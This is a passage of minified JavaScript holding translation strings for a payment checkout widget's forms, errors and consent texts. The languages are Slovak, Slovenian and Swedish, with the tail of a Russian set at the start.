действия","creditCard.encryptedSecurityCode.aria.iframeTitle":"Iframe для защиты защитного кода","creditCard.encryptedSecurityCode.aria.label":"Поле защитного кода","giftcard.encryptedCardNumber.aria.iframeTitle":"Iframe для защиты номера подарочной карты","giftcard.encryptedCardNumber.aria.label":"Поле номера подарочной карты","giftcard.encryptedSecurityCode.aria.iframeTitle":"Iframe для защиты защитного кода подарочной карты","giftcard.encryptedSecurityCode.aria.label":"Поле защитного кода подарочной карты",giftcardTransactionLimit:"Максимальная сумма, предусмотренная для отдельной операции по этой подарочной карте: %{amount}","ach.encryptedBankAccountNumber.aria.iframeTitle":"Iframe для защиты номера банковского счета","ach.encryptedBankAccountNumber.aria.label":"Поле банковского счета","ach.encryptedBankLocationId.aria.iframeTitle":"Iframe для защиты кода банка","ach.encryptedBankLocationId.aria.label":"Поле кода банка"}}),ig=Object.freeze({__proto__:null,default:{payButton:"Zaplatiť","payButton.redirecting":"Prebieha presmerovanie ...",storeDetails:"Uložiť pre moju ďalšiu platbu","creditCard.holderName":"Meno na karte","creditCard.holderName.placeholder":"J. Novák","creditCard.holderName.invalid":"Neplatné meno držiteľa karty","creditCard.numberField.title":"Číslo karty","creditCard.numberField.placeholder":"1234 5678 9012 3456","creditCard.expiryDateField.title":"Koniec platnosti","creditCard.expiryDateField.placeholder":"MM/RR","creditCard.expiryDateField.month":"Mesiac","creditCard.expiryDateField.month.placeholder":"MM","creditCard.expiryDateField.year.placeholder":"RR","creditCard.expiryDateField.year":"Rok","creditCard.cvcField.title":"CVC/CVV","creditCard.cvcField.placeholder":"123","creditCard.storeDetailsButton":"Zapamätať na budúce použitie","creditCard.cvcField.placeholder.4digits":"4 číslice","creditCard.cvcField.placeholder.3digits":"3 číslice","creditCard.taxNumber.placeholder":"RRMMDD/0123456789",installments:"Počet splátok",installmentOption:"% {times} x % {partialValue}",installmentOptionMonths:"%{times} mesiace/-ov","installments.oneTime":"Jednorazová platba","installments.installments":"Platba po splátkach","installments.revolving":"Revolvingová platba","sepaDirectDebit.ibanField.invalid":"Neplatné číslo účtu","sepaDirectDebit.nameField.placeholder":"J. Novák","sepa.ownerName":"Meno držiteľa","sepa.ibanNumber":"Číslo účtu (IBAN)","error.title":"Chyba","error.subtitle.redirect":"Nepodarilo sa presmerovať","error.subtitle.payment":"Platba zlyhala","error.subtitle.refused":"Platba bola zamietnutá","error.message.unknown":"Vyskytla sa neznáma chyba","idealIssuer.selectField.title":"Banka","idealIssuer.selectField.placeholder":"Vyberte svoju banku","creditCard.success":"Platba bola úspešná",loading:"Načítava sa…",continue:"Pokračovať",continueTo:"Pokračovať do","wechatpay.timetopay":"Na zaplatenie máte %@","wechatpay.scanqrcode":"Naskenujte QR kód",personalDetails:"Osobné údaje",companyDetails:"Údaje o spoločnosti","companyDetails.name":"Názov spoločnosti","companyDetails.registrationNumber":"Identifikačné číslo",socialSecurityNumber:"Rodné číslo",firstName:"Krstné meno",infix:"Predpona k priezvisku (ak existuje)",lastName:"Priezvisko",mobileNumber:"Mobilné telefónne číslo","mobileNumber.invalid":"Neplatné číslo na mobil",city:"Mesto",postalCode:"PSČ",countryCode:"Kód krajiny",telephoneNumber:"Telefónne číslo",dateOfBirth:"Dátum narodenia",shopperEmail:"E-mailová adresa",gender:"Pohlavie",male:"Muž",female:"Žena",billingAddress:"Fakturačná adresa",street:"Ulica",stateOrProvince:"Kraj",country:"Krajina",houseNumberOrName:"Číslo domu",separateDeliveryAddress:"Zadajte samostatnú dodaciu adresu",deliveryAddress:"Dodacia adresa",zipCode:"PSČ",apartmentSuite:"Byt/apartmán",provinceOrTerritory:"Okres alebo územie",cityTown:"Mesto/obec",address:"Adresa",state:"Štát","field.title.optional":"(voliteľné)","creditCard.cvcField.title.optional":"CVC/CVV (voliteľné)","issuerList.wallet.placeholder":"Vyberte si peňaženku",privacyPolicy:"Zásady ochrany osobných údajov","afterPay.agreement":"Súhlasím s %@ AfterPay",paymentConditions:"podmienkami platby",openApp:"Otvorte aplikáciu","voucher.readInstructions":"Prečítajte si pokyny","voucher.introduction":"Ďakujeme vám za nákup; na dokončenie platby použite nasledujúci kupón.","voucher.expirationDate":"Dátum vypršania platnosti","voucher.alternativeReference":"Alternatívny odkaz","dragonpay.voucher.non.bank.selectField.placeholder":"Vyberte si poskytovateľa","dragonpay.voucher.bank.selectField.placeholder":"Vyberte svoju banku","voucher.paymentReferenceLabel":"Platobná referencia","voucher.surcharge":"Vrátane poplatku vo výške %@","voucher.introduction.doku":"Ďakujeme vám za nákup. Na dokončenie platby použite nasledujúce informácie.","voucher.shopperName":"Meno kupujúceho","voucher.merchantName":"Predajca","voucher.introduction.econtext":"Ďakujeme vám za nákup. Na dokončenie platby použite nasledujúce informácie.","voucher.telephoneNumber":"Telefónne číslo","voucher.shopperReference":"Referencia kupujúceho","voucher.collectionInstitutionNumber":"Číslo inkasnej inštitúcie","voucher.econtext.telephoneNumber.invalid":"Telefónne číslo musí mať 10 alebo 11 číslic","boletobancario.btnLabel":"Generovať Boleto","boleto.sendCopyToEmail":"Zaslať kópiu na môj e-mail","button.copy":"Kopírovať","button.download":"Stiahnuť","creditCard.storedCard.description.ariaLabel":"Platnosť uloženej karty končí o %@","voucher.entity":"Subjekt",donateButton:"Prispieť",notNowButton:"Teraz nie",thanksForYourSupport:"Ďakujeme za podporu!",preauthorizeWith:"Predbežne autorizovať pomocou",confirmPreauthorization:"Potvrďte predbežnú autorizáciu",confirmPurchase:"Potvrďte nákup",applyGiftcard:"Uplatniť",giftcardBalance:"Zostatok na darčekovej karte",deductedBalance:"Znížený zostatok","creditCard.pin.title":"Kód PIN","creditCard.encryptedPassword.label":"Prvé 2 číslice hesla karty","creditCard.encryptedPassword.placeholder":"12","creditCard.encryptedPassword.invalid":"Neplané heslo","creditCard.taxNumber.label":"Dátum narodenia držiteľa karty (RRRMMDD) alebo identifikačné číslo organizácie (10 číslic)","creditCard.taxNumber.labelAlt":"Identifikačné číslo organizácie (10 číslic)","creditCard.taxNumber.invalid":"Neplatný dátum narodenia držiteľa karty alebo identifikačné číslo organizácie","storedPaymentMethod.disable.button":"Odstrániť","storedPaymentMethod.disable.confirmation":"Odstrániť uložený spôsob platby","storedPaymentMethod.disable.confirmButton":"Áno, odstrániť","storedPaymentMethod.disable.cancelButton":"Zrušiť","ach.bankAccount":"Bankový účet","ach.accountHolderNameField.title":"Meno majiteľa účtu","ach.accountHolderNameField.placeholder":"J. Novák","ach.accountHolderNameField.invalid":"Neplatné meno majiteľa účtu","ach.accountNumberField.title":"Číslo účtu","ach.accountNumberField.invalid":"Neplatné číslo účtu","ach.accountLocationField.title":"Smerovacie číslo ABA","ach.accountLocationField.invalid":"Neplatné smerovacie číslo ABA","select.state":"Vyberte kraj","select.stateOrProvince":"Vyberte kraj alebo okres","select.provinceOrTerritory":"Vyberte okres alebo územie","select.country":"Vyberte krajinu","select.noOptionsFound":"Neboli nájdené žiadne možnosti","select.filter.placeholder":"Vyhľadávanie...","telephoneNumber.invalid":"Neplatné telefónne číslo",qrCodeOrApp:"alebo","paypal.processingPayment":"Platba sa spracúva.",generateQRCode:"Generovať QR kód","await.waitForConfirmation":"Čaká sa na potvrdenie","mbway.confirmPayment":"Potvrďte svoju platbu v aplikácii MB WAY","shopperEmail.invalid":"Neplatná emailová adresa","dateOfBirth.format":"DD/MM/RRRR","dateOfBirth.invalid":"Musíte mať aspoň 18 rokov","blik.confirmPayment":"Otvorte svoju bankovú aplikáciu a potvrďte platbu.","blik.invalid":"Zadajte 6 číslic","blik.code":"6-ciferný kód","blik.help":"Získajte kód zo svojej bankovej aplikácie.","swish.pendingMessage":"Po nasnímaní môže spracovanie trvať až 10 minút. Pokus o opätovné zaplatenie v tejto lehote môže viesť k niekoľkým poplatkom.","error.va.gen.01":"Neúplné pole","error.va.gen.02":"Pole je neplatné","error.va.sf-cc-num.01":"Neplatné číslo karty","error.va.sf-cc-num.03":"Zadali ste nepodporovanú kartu","error.va.sf-cc-dat.01":"Karta je príliš stará","error.va.sf-cc-dat.02":"Dátum je príliš ďaleko v budúcnosti","error.va.sf-cc-dat.03":"Platnosť vašej karty vyprší pred dátumom odhlásenia","error.giftcard.no-balance":"Táto darčeková karta má nulový zostatok","error.giftcard.card-error":"V našich záznamoch nemáme žiadnu darčekovú kartu s týmto číslom","error.giftcard.currency-error":"Darčekové karty sú platné iba v mene, v ktorej boli vydané","amazonpay.signout":"Odhlásiť sa z Amazonu","amazonpay.changePaymentDetails":"Zmeniť podrobnosti o platbe","partialPayment.warning":"Ak chcete zaplatiť zostatok, vyberte iný spôsob platby","partialPayment.remainingBalance":"Zvyšný zostatok bude %{amount}","bankTransfer.beneficiary":"Príjemca","bankTransfer.iban":"IBAN","bankTransfer.bic":"BIC","bankTransfer.reference":"Referencie","bankTransfer.introduction":"Pokračujte vo vytváraní novej platby bankovým prevodom. Túto platbu môžete dokončiť pomocou informácií na nasledujúcej obrazovke.","bankTransfer.instructions":"Ďakujeme vám za nákup. Na dokončenie platby použite nasledujúce informácie.","bacs.accountHolderName":"Meno majiteľa bankového účtu","bacs.accountHolderName.invalid":"Neplatné meno majiteľa bankového účtu","bacs.accountNumber":"Číslo bankového účtu","bacs.accountNumber.invalid":"Neplatné číslo bankového účtu","bacs.bankLocationId":"Variabilný symbol","bacs.bankLocationId.invalid":"Neplatný variabilný symbol","bacs.consent.amount":"Súhlasím s tým, že nižšie uvedená čiastka bude odpísaná z môjho bankového účtu.","bacs.consent.account":"Potvrdzujem, že účet je na moje meno a som jediný podpisovateľ, ktorý je povinný autorizovať inkaso v tomto účte.",edit:"Upraviť","bacs.confirm":"Potvrdiť a zaplatiť","bacs.result.introduction":"Stiahnite si pokyny k inkasu (DDI/Mandát)","download.pdf":"Stiahnuť vo formáte PDF","creditCard.encryptedCardNumber.aria.iframeTitle":"Iframe pre zabezpečené číslo karty","creditCard.encryptedCardNumber.aria.label":"Pole pre číslo karty","creditCard.encryptedExpiryDate.aria.iframeTitle":"Iframe pre deň konca platnosti zabezpečenej karty","creditCard.encryptedExpiryDate.aria.label":"Pole dňa konca platnosti","creditCard.encryptedExpiryMonth.aria.iframeTitle":"Iframe pre mesiac konca platnosti zabezpečenej karty","creditCard.encryptedExpiryMonth.aria.label":"Pole mesiaca konca platnosti","creditCard.encryptedExpiryYear.aria.iframeTitle":"Iframe pre rok konca platnosti zabezpečenej karty","creditCard.encryptedExpiryYear.aria.label":"Pole roka konca platnosti","creditCard.encryptedSecurityCode.aria.iframeTitle":"Iframe pre bezpečnostný kód zabezpečenej karty","creditCard.encryptedSecurityCode.aria.label":"Pole bezpečnostného kódu","giftcard.encryptedCardNumber.aria.iframeTitle":"Iframe pre číslo zabezpečenej darčekovej karty","giftcard.encryptedCardNumber.aria.label":"Pole pre číslo darčekovej karty","giftcard.encryptedSecurityCode.aria.iframeTitle":"Iframe pre bezpečnostný kód zabezpečenej darčekovej karty","giftcard.encryptedSecurityCode.aria.label":"Pole bezpečnostného kódu darčekovej karty",giftcardTransactionLimit:"Pre transakciu s touto darčekovou kartou je povolené maximum %{amount}","ach.encryptedBankAccountNumber.aria.iframeTitle":"Iframe pre číslo zabezpečeného bankového účtu","ach.encryptedBankAccountNumber.aria.label":"Pole bankového účtu","ach.encryptedBankLocationId.aria.iframeTitle":"Iframe pre zabezpečené smerovacie číslo banky","ach.encryptedBankLocationId.aria.label":"Pole smerovacieho čísla banky"}}),ag=Object.freeze({__proto__:null,default:{payButton:"Plačilo","payButton.redirecting":"Preusmerjanje ...",storeDetails:"Shrani za moje naslednje plačilo","creditCard.holderName":"Ime na kartici","creditCard.holderName.placeholder":"J. Novak","creditCard.holderName.invalid":"Neveljavno ime imetnika kartice","creditCard.numberField.title":"Številka kartice","creditCard.numberField.placeholder":"1234 5678 9012 3456","creditCard.expiryDateField.title":"Datum veljavnosti","creditCard.expiryDateField.placeholder":"MM/LL","creditCard.expiryDateField.month":"Mesec","creditCard.expiryDateField.month.placeholder":"MM","creditCard.expiryDateField.year.placeholder":"LL","creditCard.expiryDateField.year":"Leto","creditCard.cvcField.title":"CVC/CVV","creditCard.cvcField.placeholder":"123","creditCard.storeDetailsButton":"Zapomni si za prihodnjič","creditCard.cvcField.placeholder.4digits":"4 števke","creditCard.cvcField.placeholder.3digits":"3 števke","creditCard.taxNumber.placeholder":"LLMMDD / 0123456789",installments:"Število obrokov",installmentOption:"%{times} × %{partialValue}",installmentOptionMonths:"Št. mesecev: %{times}","installments.oneTime":"Enkratno plačilo","installments.installments":"Obročno plačilo","installments.revolving":"Revolving plačilo","sepaDirectDebit.ibanField.invalid":"Neveljavna številka računa","sepaDirectDebit.nameField.placeholder":"J. Novak","sepa.ownerName":"Ime imetnika","sepa.ibanNumber":"Številka računa (IBAN)","error.title":"Napaka","error.subtitle.redirect":"Preusmeritev ni uspela","error.subtitle.payment":"Plačilo ni uspelo","error.subtitle.refused":"Plačilo je bilo zavrnjeno","error.message.unknown":"Prišlo je do neznane napake","idealIssuer.selectField.title":"Banka","idealIssuer.selectField.placeholder":"Izberite svojo banko","creditCard.success":"Plačilo je bilo uspešno",loading:"Nalaganje …",continue:"Nadaljuj",continueTo:"Nadaljujte na","wechatpay.timetopay":"Plačati morate %@","wechatpay.scanqrcode":"Optično preberite kodo QR",personalDetails:"Osebni podatki",companyDetails:"Podrobnosti o podjetju","companyDetails.name":"Ime podjetja","companyDetails.registrationNumber":"Matična številka podjetja",socialSecurityNumber:"Številka socialnega zavarovanja",firstName:"Ime",infix:"Naziv",lastName:"Priimek",mobileNumber:"Številka mobilnega telefona","mobileNumber.invalid":"Neveljavna številka mobilnega telefona",city:"Mesto",postalCode:"Poštna številka",countryCode:"Koda države",telephoneNumber:"Telefonska številka",dateOfBirth:"Datum rojstva",shopperEmail:"Elektronski naslov",gender:"Spol",male:"Moški",female:"Ženski",billingAddress:"Naslov za račun",street:"Ulica",stateOrProvince:"Država ali provinca",country:"Država",houseNumberOrName:"Hišna številka",separateDeliveryAddress:"Navedite ločen naslov za dostavo",deliveryAddress:"Naslov za dostavo",zipCode:"Poštna številka",apartmentSuite:"Št. apartmaja/stanovanja",provinceOrTerritory:"Območje ali ozemlje",cityTown:"Mesto",address:"Naslov",state:"Država","field.title.optional":"(izbirno)","creditCard.cvcField.title.optional":"CVC/CVV (neobvezno)","issuerList.wallet.placeholder":"Izberite svojo denarnico",privacyPolicy:"Pravilnik o zasebnosti","afterPay.agreement":"Strinjam se s %@ ponudnika AfterPay",paymentConditions:"plačilnimi pogoji",openApp:"Odprite aplikacijo","voucher.readInstructions":"Preberite navodila","voucher.introduction":"Zahvaljujemo se vam za nakup. Za dokončanje plačila uporabite naslednji kupon.","voucher.expirationDate":"Datum poteka veljavnosti","voucher.alternativeReference":"Druga referenčna številka","dragonpay.voucher.non.bank.selectField.placeholder":"Izberite svojega ponudnika","dragonpay.voucher.bank.selectField.placeholder":"Izberite svojo banko","voucher.paymentReferenceLabel":"Referenčna številka plačila","voucher.surcharge":"Vklj. %@ doplačila","voucher.introduction.doku":"Zahvaljujemo se vam za nakup. Za dokončanje plačila uporabite naslednji kupon.","voucher.shopperName":"Ime kupca","voucher.merchantName":"Trgovec","voucher.introduction.econtext":"Zahvaljujemo se vam za nakup. Za dokončanje plačila uporabite naslednji kupon.","voucher.telephoneNumber":"Telefonska številka","voucher.shopperReference":"Referenčna številka kupca","voucher.collectionInstitutionNumber":"Številka ustanove za zbiranje","voucher.econtext.telephoneNumber.invalid":"Telefonska številka mora vsebovati 10 ali 11 števk","boletobancario.btnLabel":"Ustvari Boleto","boleto.sendCopyToEmail":"Pošlji kopijo na moj elektronski naslov","button.copy":"Kopiraj","button.download":"Prenesi","creditCard.storedCard.description.ariaLabel":"Shranjena kartica se konča na %@","voucher.entity":"Entiteta",donateButton:"Donirajte",notNowButton:"Ne zdaj",thanksForYourSupport:"Zahvaljujemo se vam za podporo!",preauthorizeWith:"Predhodna odobritev s/z:",confirmPreauthorization:"Potrdi predhodno odobritev",confirmPurchase:"Potrditev nakupa",applyGiftcard:"Unovči",giftcardBalance:"Stanje na darilni kartici",deductedBalance:"Odbiti znesek","creditCard.pin.title":"PIN","creditCard.encryptedPassword.label":"Prvi dve števki gesla za kartico","creditCard.encryptedPassword.placeholder":"12","creditCard.encryptedPassword.invalid":"Neveljavno geslo","creditCard.taxNumber.label":"Datum rojstva imetnika kartice (LLMMDD) ali registracijska številka podjetja (10 števk)","creditCard.taxNumber.labelAlt":"Matična številka podjetja (10 števk)","creditCard.taxNumber.invalid":"Neveljaven datum rojstva imetnika kartice ali matična številka podjetja","storedPaymentMethod.disable.button":"Odstrani","storedPaymentMethod.disable.confirmation":"Odstrani shranjen način plačila","storedPaymentMethod.disable.confirmButton":"Da, odstrani","storedPaymentMethod.disable.cancelButton":"Prekliči","ach.bankAccount":"Bančni račun","ach.accountHolderNameField.title":"Ime imetnika računa","ach.accountHolderNameField.placeholder":"J. Novak","ach.accountHolderNameField.invalid":"Neveljavno ime imetnika računa","ach.accountNumberField.title":"Številka računa","ach.accountNumberField.invalid":"Neveljavna številka računa","ach.accountLocationField.title":"Koda banke ABA","ach.accountLocationField.invalid":"Neveljavna koda banke ABA","select.state":"Izberite državo","select.stateOrProvince":"Izberite državo ali provinco","select.provinceOrTerritory":"Izberite območje ali ozemlje","select.country":"Izberite državo","select.noOptionsFound":"Ni najdenih možnosti","select.filter.placeholder":"Iskanje ...","telephoneNumber.invalid":"Neveljavna telefonska številka",qrCodeOrApp:"ali","paypal.processingPayment":"Obdelava plačila ...",generateQRCode:"Ustvari kodo QR","await.waitForConfirmation":"Čakanje na potrditev","mbway.confirmPayment":"Potrdite svoje plačilo v aplikaciji MB WAY","shopperEmail.invalid":"Neveljaven elektronski naslov","dateOfBirth.format":"DD/MM/LLLL","dateOfBirth.invalid":"Imeti morate najmanj 18 let","blik.confirmPayment":"Za potrditev plačila odprite svojo bančno aplikacijo.","blik.invalid":"Vnesite 6 številk","blik.code":"6-mestna koda","blik.help":"Pridobite kodo iz bančne aplikacije.","swish.pendingMessage":"Ko optično preberete, lahko čakanje traja do 10 minut. Poskus ponovnega plačila v tem času lahko povzroči več odtegljajev.","error.va.gen.01":"Nepopolno polje","error.va.gen.02":"Polje ni veljavno","error.va.sf-cc-num.01":"Neveljavna številka kartice","error.va.sf-cc-num.03":"Vnesena je nepodprta kartica","error.va.sf-cc-dat.01":"Kartica je prestara","error.va.sf-cc-dat.02":"Datum je predaleč v prihodnosti","error.va.sf-cc-dat.03":"Vaša kartica poteče pred datumom odjave","error.giftcard.no-balance":"Na tej darilni kartici ni sredstev","error.giftcard.card-error":"V naši evidenci nimamo darilne kartice s to številko","error.giftcard.currency-error":"Darilne kartice so veljavne samo za valuto, za katero so bile izdane","amazonpay.signout":"Odjava iz Amazona","amazonpay.changePaymentDetails":"Sprememba podrobnosti plačila","partialPayment.warning":"Izberite drugo vrsto plačila za plačilo ostanka","partialPayment.remainingBalance":"Preostalo stanje bo %{amount}","bankTransfer.beneficiary":"Upravičenec","bankTransfer.iban":"IBAN","bankTransfer.bic":"BIC","bankTransfer.reference":"Referenca","bankTransfer.introduction":"Nadaljujte ustvarjanje novega plačila z bančnim nakazilom. Za dokončanje tega plačila lahko uporabite podatke na naslednjem zaslonu.","bankTransfer.instructions":"Zahvaljujemo se vam za nakup. Za dokončanje plačila uporabite naslednji kupon.","bacs.accountHolderName":"Ime imetnika bančnega računa","bacs.accountHolderName.invalid":"Neveljavno ime imetnika računa","bacs.accountNumber":"Številka bančnega računa","bacs.accountNumber.invalid":"Neveljavna številka bančnega računa","bacs.bankLocationId":"Številka banke","bacs.bankLocationId.invalid":"Neveljavna številka banke","bacs.consent.amount":"Soglašam s tem, da bo zgornji znesek odtegnjen z mojega bančnega računa.","bacs.consent.account":"Potrjujem, da je račun ustvarjen v mojem imenu in sem edini podpisnik za odobritev neposredne bremenitve za ta račun.",edit:"Uredi","bacs.confirm":"Potrdi in plačaj","bacs.result.introduction":"Prenesite navodila za neposredno bremenitev (DDI/mandat)","download.pdf":"Prenos datoteke PDF","creditCard.encryptedCardNumber.aria.iframeTitle":"Iframe za zavarovano številko kartice","creditCard.encryptedCardNumber.aria.label":"Polje s številko kartice","creditCard.encryptedExpiryDate.aria.iframeTitle":"Iframe za zavarovan potek veljavnosti kartice","creditCard.encryptedExpiryDate.aria.label":"Polje z datumom poteka veljavnosti","creditCard.encryptedExpiryMonth.aria.iframeTitle":"Iframe za zavarovan mesec poteka veljavnosti kartice","creditCard.encryptedExpiryMonth.aria.label":"Polje z mesecem poteka veljavnosti","creditCard.encryptedExpiryYear.aria.iframeTitle":"Iframe za zavarovano leto poteka veljavnosti kartice","creditCard.encryptedExpiryYear.aria.label":"Polje z letom poteka veljavnosti","creditCard.encryptedSecurityCode.aria.iframeTitle":"Iframe za zavarovano varnostno kodo kartice","creditCard.encryptedSecurityCode.aria.label":"Polje z varnostno kodo","giftcard.encryptedCardNumber.aria.iframeTitle":"Iframe za zavarovano številko darilne kartice","giftcard.encryptedCardNumber.aria.label":"Polje s številko darilne kartice","giftcard.encryptedSecurityCode.aria.iframeTitle":"Iframe za zavarovano varnostno kodo darilne kartice","giftcard.encryptedSecurityCode.aria.label":"Polje z varnostno kodo darilne kartice",giftcardTransactionLimit:"Za posamezno transakcijo na tej darilni kartici je dovoljeno največ %{amount}","ach.encryptedBankAccountNumber.aria.iframeTitle":"Iframe za zavarovano številko bančnega računa","ach.encryptedBankAccountNumber.aria.label":"Polje z bančnim računom","ach.encryptedBankLocationId.aria.iframeTitle":"Iframe za zavarovano kodo banke","ach.encryptedBankLocationId.aria.label":"Polje s kodo banke"}}),og=Object.freeze({__proto__:null,default:{payButton:"Betala","payButton.redirecting":"Omdirigerar…",storeDetails:"Spara till min nästa betalning","creditCard.holderName":"Namn på kort","creditCard.holderName.placeholder":"J. Smith","creditCard.holderName.invalid":"Kortinnehavarens namn är ogiltigt","creditCard.numberField.title":"Kortnummer","creditCard.numberField.placeholder":"1234 5678 9012 3456","creditCard.expiryDateField.title":"Utgångsdatum","creditCard.expiryDateField.placeholder":"MM/AA","creditCard.expiryDateField.month":"Månad","creditCard.expiryDateField.month.placeholder":"MM","creditCard.expiryDateField.year.placeholder":"ÅÅ","creditCard.expiryDateField.year":"År","creditCard.cvcField.title":"CVC / CVV","creditCard.cvcField.placeholder":"123","creditCard.storeDetailsButton":"Kom ihåg till nästa gång","creditCard.cvcField.placeholder.4digits":"4 siffror","creditCard.cvcField.placeholder.3digits":"3 siffror","creditCard.taxNumber.placeholder":"ÅÅMMDD / 0123456789",installments:"Number of installments",installmentOption:"%{times} x %{partialValue}",installmentOptionMonths:"%{times} månader","installments.oneTime":"Engångsbetalning","installments.installments":"Delbetalningar","installments.revolving":"Uppdelad betalning","sepaDirectDebit.ibanField.invalid":"Ogiltigt kontonummer","sepaDirectDebit.nameField.placeholder":"J. Johansson","sepa.ownerName":"Känt av kontoinnehavaren","sepa.ibanNumber":"Kontonummer (IBAN)","error.title":"Fel","error.subtitle.redirect":"Omdirigering misslyckades","error.subtitle.payment":"Betalning misslyckades","error.subtitle.refused":"Betalning avvisad","error.message.unknown":"Ett okänt fel uppstod","idealIssuer.selectField.title":"Bank","idealIssuer.selectField.placeholder":"Välj din bank","creditCard.success":"Betalning lyckades",loading:"Laddar…",continue:"Fortsätt",continueTo:"Fortsätt till","wechatpay.timetopay":"Du har %@ att betala","wechatpay.scanqrcode":"Skanna QR-kod",personalDetails:"Personuppgifter",companyDetails:"Företagsinformation","companyDetails.name":"Företagsnamn","companyDetails.registrationNumber":"Registreringsnummer",socialSecurityNumber:"Personnummer",firstName:"Förnamn",infix:"Prefix",lastName:"Efternamn",mobileNumber:"Mobilnummer","mobileNumber.invalid":"Ogiltigt mobilnummer",city:"Stad",postalCode:"Postnummer",countryCode:"Landskod",telephoneNumber:"Telefonnummer",dateOfBirth:"Födelsedatum",shopperEmail:"E-postadress",gender:"Kön",male:"Man",female:"Kvinna",billingAddress:"Faktureringsadress",street:"Gatuadress",stateOrProvince:"Delstat eller region",country:"Land",houseNumberOrName:"Husnummer",separateDeliveryAddress:"Ange en separat leveransadress",deliveryAddress:"Leveransadress",zipCode:"Postnummer",apartmentSuite:"Lägenhetsnummer",provinceOrTerritory:"Provins eller territorium",cityTown:"Ort",address:"Adress",state:"Delstat","field.title.optional":"(valfritt)","creditCard.cvcField.title.optional":"CVC/CVV (tillval)","issuerList.wallet.placeholder":"Väj din plånbok",privacyPolicy:"Sekretesspolicy","afterPay.agreement":"Jag godkänner AfterPays %@",paymentConditions:"betalvillkor",openApp:"Öppna appen","voucher.readInstructions":"Läs instruktionerna","voucher.introduction":"Tack för ditt köp, vänligen använd följande kupong för att slutföra din betalning.","voucher.expirationDate":"Utgångsdatum","voucher.alternativeReference":"Alternativ referens","dragonpay.voucher.non.bank.selectField.placeholder":"Välj din leverantör","dragonpay.voucher.bank.selectField.placeholder":"Välj din bank","voucher.paymentReferenceLabel":"Betalreferens","voucher.surcharge":"Inklusive %@ i avgift","voucher.introduction.doku":"Tack för ditt köp, vänligen använd följande information för att slutföra din betalning.","voucher.shopperName":"Konsumentens namn","voucher.merchantName":"Handlare","voucher.introduction.econtext":"Tack för ditt köp, vänligen använd följande information för att slutföra din betalning.","voucher.telephoneNumber":"Telefonnummer","voucher.shopperReference":"Köparreferens","voucher.collectionInstitutionNumber":"Nummer på upphämtningsplats","voucher.econtext.telephoneNumber.invalid":"Telefonnumret måste innehålla 10 eller 11 siffror","boletobancario.btnLabel":"Generera Boleto","boleto.sendCopyToEmail":"Skicka en kopia till min e-post","button.copy":"Kopiera","button.download":"Ladda ner","creditCard.storedCard.description.ariaLabel":"Sparat kort slutar på %@","voucher.entity":"Enhet",donateButton:"Donera",notNowButton:"Inte nu",thanksForYourSupport:"Tack för ditt stöd!",preauthorizeWith:"Förauktorisera med",confirmPreauthorization:"Bekräfta förauktorisering",confirmPurchase:"Bekräfta köp",applyGiftcard:"Lös in",giftcardBalance:"Presentkortssaldo",deductedBalance:"Avdraget saldo","creditCard.pin.title":"PIN-kod","creditCard.encryptedPassword.label":"De två första siffrorna i kortets lösenord","creditCard.encryptedPassword.placeholder":"12","creditCard.encryptedPassword.invalid":"Ogiltigt lösenord","creditCard.taxNumber.label":"Kortinnehavarens födelsedatum (ÅÅMMDD) eller företagets organisationsnummer (10 siffror)","creditCard.taxNumber.labelAlt":"Företagets organisationsnummer (10 siffror)","creditCard.taxNumber.invalid":"Ogiltigt födelsedatum eller organisationsnummer","storedPaymentMethod.disable.button":"Ta bort","storedPaymentMethod.disable.confirmation":"Ta bort sparat betalningssätt","storedPaymentMethod.disable.confirmButton":"Ja, ta bort","storedPaymentMethod.disable.cancelButton":"Avbryt","ach.bankAccount":"Bankkonto","ach.accountHolderNameField.title":"Kontoinnehavarens namn","ach.accountHolderNameField.placeholder":"A. Andersson","ach.accountHolderNameField.invalid":"Kontoinnehavarens namn är ogiltigt","ach.accountNumberField.title":"Kontonummer","ach.accountNumberField.invalid":"Ogiltigt kontonummer","ach.accountLocationField.title":"ABA-nummer","ach.accountLocationField.invalid":"Ogiltigt ABA-nummer","select.state":"Välj delstat","select.stateOrProvince":"Välj delstat eller provins","select.provinceOrTerritory":"Välj provins eller territorium","select.country":"Välj land","select.noOptionsFound":"Inga alternativ hittades","select.filter.placeholder":"Sök efter…","telephoneNumber.invalid":"Ogiltigt telefonnummer",qrCodeOrApp:"eller","paypal.processingPayment":"Behandlar betalning …",generateQRCode:"Generera QR-kod","await.waitForConfirmation":"Väntar på bekräftelse","mbway.confirmPayment":"Bekräfta din betalning i appen MB WAY","shopperEmail.invalid":"Ogiltig e-postadress","dateOfBirth.format":"DD/MM/ÅÅÅÅ","dateOfBirth.invalid":"Du måste vara minst 18 år","blik.confirmPayment":"Öppna din bankapp för att bekräfta betalningen.","blik.invalid":"Ange 6 siffror","blik.code":"Sexsiffrig kod","blik.help":"Hämta koden från din bankapp.","swish.pendingMessage":"När du har skannat kan statusen vara väntande i upp till tio minuter. Att försöka betala igen inom denna tid kan leda till flera debiteringar.","error.va.gen.01":"Ofullständigt fält","error.va.gen.02":"Fältet ogiltigt","error.va.sf-cc-num.01":"Ogiltigt kortnummer","error.va.sf-cc-num.03":"Det angivna kortet stöds inte","error.va.sf-cc-dat.01":"Kortet är för gammalt","error.va.sf-cc-dat.02":"Datumet ligger för långt fram i framtiden","error.va.sf-cc-dat.03":"Ditt kort går ut före betalningsdatumet","error.giftcard.no-balance":"Saldot för detta presentkort är noll","error.giftcard.card-error":"Vi har inte registrerat något presentkort med det numret","error.giftcard.currency-error":"Presentkort är endast giltiga i den valuta som de utfärdades i","amazonpay.signout":"Logga ut från Amazon","amazonpay.changePaymentDetails":"Ändra betalningsuppgifter","partialPayment.warning":"Välj ett annat betalningssätt för att betala det återstående","partialPayment.remainingBalance":"Återstående saldo blir %{amount}","bankTransfer.beneficiary":"Mottagare","bankTransfer.iban":"IBAN","bankTransfer.bic":"BIC","bankTransfer.reference":"referens","bankTransfer.introduction":"Fortsätt för att skapa en ny banköverföring. Du kan använda informationen på följande skärm för att slutföra denna betalning.","bankTransfer.instructions":"Tack för ditt köp! Använd följande information för att slutföra din betalning.","bacs.accountHolderName":"Bankkontoinnehavarens namn","bacs.accountHolderName.invalid":"Ogiltigt namn på bankkontoinnehavare","bacs.accountNumber":"Bankkontonummer","bacs.accountNumber.invalid":"Ogiltigt bankkontonummer","bacs.bankLocationId":"Clearingnummer","bacs.bankLocationId.invalid":"Ogiltigt clearingnummer","bacs.consent.amount":"Jag godkänner att ovanstående belopp dras från mitt bankkonto.","bacs.consent.account":"Jag bekräftar att jag är kontoinnehavare och att jag är den enda person vars 